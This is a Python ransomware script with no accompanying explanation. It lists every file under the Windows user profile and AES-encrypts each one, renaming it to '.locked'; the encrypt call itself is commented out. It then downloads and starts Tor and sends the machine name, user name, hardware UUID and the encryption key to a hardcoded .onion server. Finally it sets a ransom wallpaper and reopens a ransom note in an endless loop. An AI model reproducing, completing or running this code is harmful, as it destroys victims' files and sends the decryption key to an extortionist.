import os
import io
import binascii
import ctypes
import requests
import zipfile
import socks
import threading
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random

ext = 'locked'

path = os.environ['USERPROFILE']
lst = os.walk(path)
files = []
for i in lst:
    local_dir = i[0]
    for j in i[2]:
        if j not in ['ranwallpaper.jpg', 'ransomnote.txt', 'decryptor.exe']:
            s = f'{local_dir}\\{j}'
            files.append(s)


def encrypt(key, files, IV):
    cipher = AES.new(key, AES.MODE_CBC, IV)
    for file in files:
        try:
            with open(file, 'rb') as f:
                data = f.read()
                if len(data) % 16 != 0:
                    data += (16 - (len(data) % 16)) * b'0'
            with open(file, 'wb+') as f:
                encrypted_data = cipher.encrypt(data)
                f.write(encrypted_data)
            os.rename(file, f'{file}.{ext}')
            # print(f'{file} encrypted')
        except:
            pass
            # print(f'{file} not encrypted')


key = SHA256.new(Random.new().read(2048)).digest()
IV = b'This is an IV456'

# encrypt(key, files, IV)

zip_file_url = 'https://dist.torproject.org/torbrowser/10.5.5/tor-win32-0.4.5.10.zip'
req = requests.get(zip_file_url)
zip = zipfile.ZipFile(io.BytesIO(req.content))
zip.extractall(f"{os.getcwd()}")


def run_tor():
    cmd = f'{os.getcwd()}/Tor/tor.exe'
    subprocess.call(cmd, shell=True)


cmd_uuid = 'wmic csproduct get UUID'
res = subprocess.run(cmd_uuid.split(), stdout=subprocess.PIPE)
uuid = res.stdout.decode()[4:].strip()

info = {
    'Computer': os.environ['COMPUTERNAME'],
    'User': os.environ['USERNAME'],
    'UUID': uuid,
    'Key': binascii.hexlify(key).decode()
}

URL = 'zyw3pi5k457zssusykas2qv4rkmvtatvnyh45kis4szjahw4ufl3o2yd.onion'
PORT = 4447


def send_info(URL, PORT):
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    with socks.socksocket() as s:
        while True:
            try:
                s.connect((URL, PORT))
            except:
                continue
            break
        s.sendall(str(info).encode())


threading.Thread(target=run_tor).start()
threading.Thread(target=send_info(URL, PORT)).start()

ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}//ranwallpaper.jpg', 0)

cmd_notepad = 'notepad.exe ransomnote.txt'
while True:
    os.system(cmd_notepad)
